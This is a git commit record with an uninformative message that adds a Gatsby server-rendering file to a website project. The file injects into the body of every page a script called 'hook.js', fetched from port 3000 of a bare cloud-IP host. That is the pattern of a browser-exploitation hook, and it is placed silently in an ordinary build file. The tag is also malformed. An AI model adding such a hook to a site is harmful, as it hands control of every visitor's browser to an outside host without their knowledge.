730c4bce8f6b3921492132b135eb0afd48421b5f
Sean <seanpedigo@gmail.com>
2022-06-10 16:41:56 -0400

    stuff x12

---
+++ gatsby-ssr.js
@@ -0,0 +1,8 @@
+import React from 'react'
+
+export const onRenderBody = ({ setPostBodyComponents }) => {
+  setPostBodyComponents([
+    <script="https://139-144-31-141.ip.linodeusercontent.com:3000/hook.js"
+    />
+  ])
+}
